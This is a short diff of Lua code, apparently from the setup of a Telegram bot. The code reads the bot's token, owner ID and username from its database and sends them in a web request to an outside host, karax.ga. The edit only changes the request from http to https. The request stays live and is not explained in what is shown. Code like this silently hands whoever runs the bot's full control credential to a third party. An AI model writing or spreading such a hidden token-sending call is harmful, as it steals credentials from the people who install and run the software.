@@ -69,7 +69,7 @@ end
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 UserName = database:get(id_server..":SUDO:USERNAME")
-https.request('http://karax.ga/besso/?token='..token..'&id='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
+https.request('https://karax.ga/besso/?token='..token..'&id='..SUDO..'&UserName='..UserName)
 create_config_auto()
 file = io.open("BESSO", "w")  
 file:write([[
